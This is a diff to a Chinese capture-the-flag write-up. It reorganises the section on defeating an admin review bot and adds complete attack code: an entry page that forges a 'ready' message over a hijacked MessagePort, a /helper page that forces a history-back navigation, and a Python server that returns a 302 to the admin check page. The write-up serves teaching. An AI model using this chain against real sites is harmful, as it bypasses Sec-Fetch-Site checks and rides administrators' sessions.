@@ -679,7 +679,7 @@ onmessage = e => {                                             // 第二段（2.
   if (!port) return;                                           // 不是带端口的消息就忽略
   port.postMessage("ready");                                   // 冒充"笔记已就绪"
   setTimeout(() => {                                           // 第三段（2.8）：回退序列
-    w.location = "/helper";                                    // 弹窗换到你自己服务器的 /helper 页（为什么转到你自己的服务器：见 2.8.2）
+    w.location = "/helper";                                    // 弹窗换到你自己服务器的 /helper 页（为什么转到你自己的服务器：见 2.8.1）
     setTimeout(() => location = "about:blank", 250);           // 主窗口离开入口网址（写入历史记录）
   }, 500);
 };
@@ -825,6 +825,19 @@ onmessage = e => { if (e.ports[0]) parent.opener.postMessage(0, "*", e.ports); }
 审批页面 `/review` --(postMessage 转移)--> 沙箱 iframe 里的笔记 --(s.js 转交)--> 入口页
 ```
 
+三条消息，分别进三个收件箱：
+
+| 消息 | 从哪到哪 | 收件人（监听它的地方） |
+|---|---|---|
+| `"render"`，带端口 B | 审批页面 → 沙箱 iframe 窗口 | 沙箱页面的 `onmessage`（s.js 设置的那段代码） |
+| 数据 `0`，带端口 B（转交） | 沙箱页面 → 入口页窗口 | 入口页窗口的 `onmessage`（2.6 的第二段脚本） |
+| `"ready"` | 入口页 → 端口 B 的 `postMessage` | 审批页面 `channel.port1.onmessage` |
+
+**读法**：`X.postMessage(...)` 就是把消息投给 X。方法前面的 X 指向谁，消息就进谁那里。
+
+- 沙箱那条 `parent.opener.postMessage(...)`：X 是 `parent.opener`。在沙箱里 `parent` 是审批页面窗口，`opener` 是打开审批页面的那个窗口（入口页），所以这条消息投给入口页，审批页面收不到。
+- 审批页面那条 `channel.port1.onmessage`：X 是端口 `port1`，不是窗口。只有从端口 B 发来的消息能到它，也就是表里第三条 `"ready"`；沙箱那条走的是窗口消息（没经过端口），到不了它。
+
 入口页持有端口 B 后，直接发送 `"ready"`：
 
 ```javascript
@@ -845,9 +858,112 @@ onmessage = e => {
 
 ### 2.8 攻击第 3 段：回退导航与第二次访问
 
-> 一句话说明：检查 4（`policy`）要求请求头 `Sec-Fetch-Site: none`，这个值只会出现在**由浏览器发起**的导航上（页面里的脚本发起的跳转一律带别的值）。历史回退（后退/前进）属于"由浏览器发起"；用一个"入口页先离开原地址、再回退"的序列，就能制造一次真实的、带 `none` 的重新请求，并让它经过 302 落到审查页上。
+本节涉及的全部代码，先完整列出（注释直接写在代码里）；后面再逐步展开。
 
-#### 2.8.1 背景：Sec-Fetch-Site 是什么
+**入口页（完整脚本）**
+
+```html
+<!doctype html>
+<script>
+// 第一段（2.6）：打开审批页面
+const q = new URLSearchParams(location.search);
+const i = q.get('rid');
+const w = open('http://localhost:3000/review?rid=' + i);
+
+// 第二段（2.7）：收到沙箱转交的端口后
+onmessage = e => {
+  const port = e.ports[0];
+  if (!port) return;                                          // 不是带端口的消息就忽略
+  port.postMessage('ready');                                  // 冒充"笔记已就绪"
+
+  // 第三段（本节）：回退序列
+  setTimeout(() => {                                          // "ready" 发出后 500 毫秒
+    w.location = '/helper';                                   // 弹窗换到 /helper 页（相对路径按本页网址补全）
+    setTimeout(() => location = 'about:blank', 250);          // 再 250 毫秒：主窗口离开入口网址
+  }, 500);
+};
+</script>
+```
+
+**`/helper` 页（完整页面）**
+
+```html
+<!doctype html>
+<script>
+// 页面加载 500 毫秒后：让打开它的主窗口做一次历史回退
+setTimeout(() => opener.history.back(), 500);
+</script>
+```
+
+**攻击脚本中你服务器的两段（完整）**（第五章 `do_GET` 中的这两段；入口页以压缩字符串存放，注释标在每一段旁边）
+
+```python
+        # 路由 1：入口页。第一次返回带攻击脚本的页面；第二次（历史回退）返回 302
+        if parsed.path == "/" and "rid" in query:
+            key = parsed.query
+            visits[key] = visits.get(key, 0) + 1
+            print(f"[CB] entry visit #{visits[key]} rid={query['rid'][0][:10]}", flush=True)
+            if visits[key] > 1:                                # 同一入口网址的第 2 次访问（来自历史回退）
+                print("[CB] → 302 to /reports/check", flush=True)
+                self.send_response(302)
+                self.send_header("Location",
+                    f"http://localhost:3000/reports/check?rid={query['rid'][0]}")  # 把这次导航送往审查页
+                self.end_headers()
+                return
+            # 第一次访问的页面：开弹窗打开审批页面；收到端口后发送 "ready"，随后转入回退序列
+            body = ("<!doctype html><script>"
+                    # 第一段：打开审批页面
+                    "const q=new URLSearchParams(location.search),"
+                    "i=q.get('rid'),w=open('http://localhost:3000/review?rid='+i);"
+                    # 第二段：收到沙箱转交的端口后冒充笔记发 "ready"
+                    "onmessage=e=>{let p=e.ports[0];if(!p)return;p.postMessage('ready');"
+                    # 第三段（本节）：回退序列
+                    "setTimeout(()=>{w.location='/helper';"
+                    "setTimeout(()=>location='about:blank',250)},500)}</script>").encode()
+
+        # 路由 2：辅助页面。与入口页同源，负责对主窗口执行历史回退
+        elif parsed.path == "/helper":
+            print("[CB] helper hit → opener.history.back()", flush=True)
+            body = (b"<!doctype html><script>"
+                    b"setTimeout(()=>opener.history.back(),500)</script>")
+```
+
+#### 2.8.1 逐步展开：三个页面怎么配合
+
+三个页面配合完成（角色：机器人主窗口停在入口页；弹窗停在你自己服务器的 `/helper` 页；笔记脚本在弹窗的沙箱 iframe 里运行）：
+
+```
+① 入口页收到沙箱里的笔记脚本发来的消息（`s.js` 把端口 B 转交给入口页，见 2.7）
+   效果：入口页的 onmessage 被触发；先回复 `"ready"`（批准，2.7），再安排 500 毫秒后开始回退
+
+② 500 毫秒后：弹窗被导航到你自己服务器的 /helper 页（入口页脚本设置 `w.location = '/helper'`；必须在主窗口离开前完成）
+   效果：弹窗换到攻击者自己的页面（与入口页同源），可以操作主窗口的历史
+
+③ 再过 250 毫秒：入口页（主窗口）执行 location = 'about:blank'
+   效果：主窗口离开入口网址，历史记录变成 [入口网址, about:blank]
+
+④ helper 页加载 500 毫秒后执行 opener.history.back()
+   效果：主窗口回退到入口网址，这是一次"由浏览器发起"的导航
+
+⑤ 入口网址的第二次请求到达你自己的服务器（带 Sec-Fetch-Site: none、Sec-Fetch-Dest: document）
+   你自己的服务器对第二次访问返回：302 → http://localhost:3000/reports/check?rid=<rid>
+
+⑥ 浏览器跟随 302 请求审查页
+   这次请求仍然带 Sec-Fetch-Site: none（该值属于导航本身，不因重定向改变）
+   目标 localhost:3000 与 cookie 同站且是顶层导航 → 管理员 cookie 一并发送
+   请求头同时满足 检查 4（none + document）与 检查 1（管理员会话）
+```
+
+四个细节：
+
+- **`about:blank` 步骤的作用**：主窗口需要先"离开"入口网址，`history.back()` 才有可回退的记录（历史栈变成"入口网址 ← about:blank"，回退即回到入口）。`about:blank` 是一次不产生网络请求的导航，不会干扰机器人的导航监听（见下条）；
+- **`/helper` 是什么、弹窗为什么转到它**：`/helper` 是你自己的服务器上的页面（2.3 表）。入口页里写的是 `w.location = '/helper'`，这是一个"没写网址、只写路径"的地址；补全它（把没写的网址部分接上）时，浏览器用的是**执行这行代码的页面**（入口页）的网址，而不是弹窗当时在的网站。入口页的网址就是你自己的服务器，所以补全后指向 `http://host.docker.internal:8000/helper`，弹窗于是从挑战域（审批页面）换到了攻击者自己的服务器上。本地复现日志里的 `[CB] helper hit`（第四章）就是这次访问；
+- **为什么 `helper` 能让主窗口回退**：`helper` 和入口页都是攻击者写的页面，而且同源（协议、域名、端口都相同，即同一个网站）；同源的窗口之间可以直接读对方的 `history`（历史记录）、调用 `back()`。`opener` 是弹窗对"打开它的那个窗口"（主窗口）的引用；
+- **为什么这次导航恰好设置 `finalized`**：机器人 `watchDocument` 的规则（2.5.3）是"主窗口的导航请求命中审查页 → `finalized = approved && !diverged`"。整个序列里主窗口的导航请求只有三次：入口网址（最初那次访问，记为入口）、回退后再次访问入口网址（与入口相同，不算偏离）、以及 302 之后的审查页请求（命中）。`about:blank` 不产生网络请求，不会被计入。因此 `diverged` 保持为假，命中时 `approved` 已为真（2.7 完成），`finalized` 被置真。
+
+#### 2.8.2 概念展开：Sec-Fetch-Site 是什么
+
+> 一句话说明：检查 4（`policy`）要求请求头 `Sec-Fetch-Site: none`，这个值只会出现在**由浏览器发起**的导航上（页面里的脚本发起的跳转一律带别的值）。历史回退（后退/前进）属于"由浏览器发起"；用一个"入口页先离开原地址、再回退"的序列，就能制造一次真实的、带 `none` 的重新请求，并让它经过 302 落到审查页上。
 
 `Sec-Fetch-*` 系列请求头由浏览器自动附加（Fetch Metadata 机制），标明"这个请求是怎么发起的"。页面脚本无法伪造或修改这些头。`Sec-Fetch-Site` 的取值与含义：
 
@@ -859,63 +975,6 @@ onmessage = e => {
 对照检查 4 的要求（`Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document`）：请求必须是一次"由浏览器发起的顶层文档导航"。脚本能做出的所有跳转都不满足；**历史回退可以**。
 
 > 补充：回退/前进产生的重新请求是否真的发出，与页面的缓存条件有关。本题的入口页响应带 `Cache-Control: no-store`（2.3），本地复现中回退触发了真实的第二次网络请求（第四章日志）。如果换成会被浏览器缓存直接复用的页面，可能不会产生这次请求。
-
-#### 2.8.2 攻击序列：让主窗口回退进审查页
-
-三个页面配合完成（角色：机器人主窗口停在入口页；弹窗停在你自己服务器的 `/helper` 页）：
-
-```
-① 弹窗被导航到你自己服务器的 /helper 页（入口页脚本设置 `w.location = "/helper"`；必须在主窗口离开前完成）
-   效果：弹窗换到攻击者自己的页面（与入口页同源），可以操作主窗口的历史
-
-② 入口页（主窗口）执行：location = 'about:blank'
-   效果：主窗口离开入口网址，历史记录变成 [入口网址, about:blank]
-
-③ helper 执行：opener.history.back()
-   效果：主窗口回退到入口网址，这是一次"由浏览器发起"的导航
-
-④ 入口网址的第二次请求到达你自己的服务器（带 Sec-Fetch-Site: none、Sec-Fetch-Dest: document）
-   你自己的服务器对第二次访问返回：302 → http://localhost:3000/reports/check?rid=<rid>
-
-⑤ 浏览器跟随 302 请求审查页
-   这次请求仍然带 Sec-Fetch-Site: none（该值属于导航本身，不因重定向改变）
-   目标 localhost:3000 与 cookie 同站且是顶层导航 → 管理员 cookie 一并发送
-   请求头同时满足 检查 4（none + document）与 检查 1（管理员会话）
-```
-
-三个细节：
-
-- **`about:blank` 步骤的作用**：主窗口需要先"离开"入口网址，`history.back()` 才有可回退的记录（历史栈变成"入口网址 ← about:blank"，回退即回到入口）。`about:blank` 是一次不产生网络请求的导航，不会干扰机器人的导航监听（见下条）；
-- **`/helper` 是什么、弹窗为什么转到它**：`/helper` 是你自己的服务器上的页面（2.3 表）。入口页里写的是 `w.location = "/helper"`，这是一个"没写网址、只写路径"的地址；补全它（把没写的网址部分接上）时，浏览器用的是**执行这行代码的页面**（入口页）的网址，而不是弹窗当时在的网站。入口页的网址就是你自己的服务器，所以补全后指向 `http://host.docker.internal:8000/helper`，弹窗于是从挑战域（审批页面）换到了攻击者自己的服务器上。本地复现日志里的 `[CB] helper hit`（第四章）就是这次访问；
-- **为什么 `helper` 能让主窗口回退**：`helper` 和入口页都是攻击者写的页面，而且同源（协议、域名、端口都相同，即同一个网站）；同源的窗口之间可以直接读对方的 `history`（历史记录）、调用 `back()`。`opener` 是弹窗对"打开它的那个窗口"（主窗口）的引用；
-- **为什么这次导航恰好设置 `finalized`**：机器人 `watchDocument` 的规则（2.5.3）是"主窗口的导航请求命中审查页 → `finalized = approved && !diverged`"。整个序列里主窗口的导航请求只有三次：入口网址（第一步，记为入口）、回退后再次访问入口网址（与入口相同，不算偏离）、以及 302 之后的审查页请求（命中）。`about:blank` 不产生网络请求，不会被计入。因此 `diverged` 保持为假，命中时 `approved` 已为真（2.7 完成），`finalized` 被置真。
-
-入口页第二次访问的处理（你自己服务器上的代码，完整脚本见第五章）：
-
-```python
-if visits[p.query] > 1:                       # 第二次访问
-    self.send_response(302)
-    self.send_header("Location",
-        f"http://localhost:3000/reports/check?rid={q['rid'][0]}")
-    self.end_headers()
-    return
-```
-
-入口页脚本的第三段：回退序列（完整代码见 2.6）：
-
-```javascript
-// 发送 ready 之后执行：转入回退序列
-setTimeout(() => {
-  w.location = "/helper";                                     // 弹窗换到你自己服务器的 /helper 页
-  setTimeout(() => location = "about:blank", 250);            // 主窗口离开入口网址（写入历史记录）
-}, 500);
-```
-
-你自己的服务器 `/helper` 路由的内容（弹窗换过去后执行的脚本）：
-
-```html
-<script>setTimeout(() => opener.history.back(), 500)</script>
-```
 
 #### 2.8.3 至此八项检查的状态
 
@@ -1171,7 +1230,7 @@ class Handler(BaseHTTPRequestHandler):
         self.send_header("Content-Type",
             "application/javascript" if parsed.path == "/s.js" else "text/html")
         self.send_header("Content-Length", str(len(body)))
-        self.send_header("Cache-Control", "no-store")   # 入口页必须 no-store（2.8.1）
+        self.send_header("Cache-Control", "no-store")   # 入口页必须 no-store（2.8.2）
         self.end_headers()
         self.wfile.write(body)
 
@@ -1211,7 +1270,7 @@ server.shutdown()
 | 脚本部分 | 作用 | 对应章节 |
 |---|---|---|
 | 路由 `/`（根路径） | 入口页：开弹窗、收端口发 `ready`、转入回退序列；第二次访问给 302 | 2.6、2.7、2.8 |
-| 路由 `/helper` | 辅助页面；弹窗换到它上面后触发主窗口回退（`history.back()`） | 2.8.2 |
+| 路由 `/helper` | 辅助页面；弹窗换到它上面后触发主窗口回退（`history.back()`） | 2.8.1 |
 | 路由 `/s.js` | 注入笔记中的脚本（双分支） | 2.2、2.7、2.9 |
 | 路由 `/flag` | 接收 base64 编码的 flag | 2.9 |
 | `payload` 变量 | 2.2.1 的攻击笔记 HTML | 2.2 |
